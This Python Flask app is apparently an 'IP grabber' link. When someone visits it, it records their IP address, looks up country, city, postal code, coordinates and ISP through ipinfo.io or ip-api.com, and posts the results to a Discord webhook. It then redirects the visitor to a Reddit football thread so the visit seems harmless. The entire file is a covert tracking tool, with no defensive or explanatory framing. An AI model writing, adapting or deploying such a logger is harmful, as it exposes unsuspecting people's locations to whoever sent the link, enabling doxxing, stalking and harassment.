from flask import Flask, request, redirect
import requests

app = Flask(__name__)

DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_HERE'
IPINFO_TOKEN = 'YOUR_IPINFO_TOKEN_HERE'

def get_visitor_info(ip):
    info = {'ip': ip}
    # Try IPinfo first
    ipinfo_url = f'https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}'
    try:
        r = requests.get(ipinfo_url, timeout=5)
        data = r.json()
        if 'error' not in data:
            loc = data.get('loc', '')  # format: "lat,lon"
            if loc:
                lat, lon = loc.split(',')
            else:
                lat = lon = 'Unknown'
            info.update({
                'country': data.get('country', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'postal': data.get('postal', 'Unknown'),
                'timezone': data.get('timezone', 'Unknown'),
                'org': data.get('org', 'Unknown'),
                'latitude': lat,
                'longitude': lon
            })
            return info
    except Exception:
        pass  # fallback to next

    # Fallback to ip-api.com
    ipapi_url = f'http://ip-api.com/json/{ip}'
    try:
        r = requests.get(ipapi_url, timeout=5)
        data = r.json()
        if data.get('status') == 'success':
            info.update({
                'country': data.get('country', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'latitude': data.get('lat', 'Unknown'),
                'longitude': data.get('lon', 'Unknown'),
                'timezone': data.get('timezone', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
            })
        else:
            info['error'] = 'Failed to get location'
    except Exception as e:
        info['error'] = str(e)

    return info

def send_to_discord(info):
    content = (
        f"**Visitor Info:**\n"
        f"IP: {info.get('ip')}\n"
        f"Country: {info.get('country', 'N/A')}\n"
        f"Region: {info.get('region', 'N/A')}\n"
        f"City: {info.get('city', 'N/A')}\n"
        f"Postal: {info.get('postal', 'N/A')}\n"
        f"Latitude: {info.get('latitude', 'N/A')}\n"
        f"Longitude: {info.get('longitude', 'N/A')}\n"
        f"Timezone: {info.get('timezone', 'N/A')}\n"
        f"Org/ISP: {info.get('org', info.get('isp', 'N/A'))}\n"
        f"Error: {info.get('error', 'None')}"
    )
    payload = {
        "username": "hexdtz",
        "content": content
    }
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    info = get_visitor_info(ip)
    send_to_discord(info)
    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == '__main__':
    app.run()
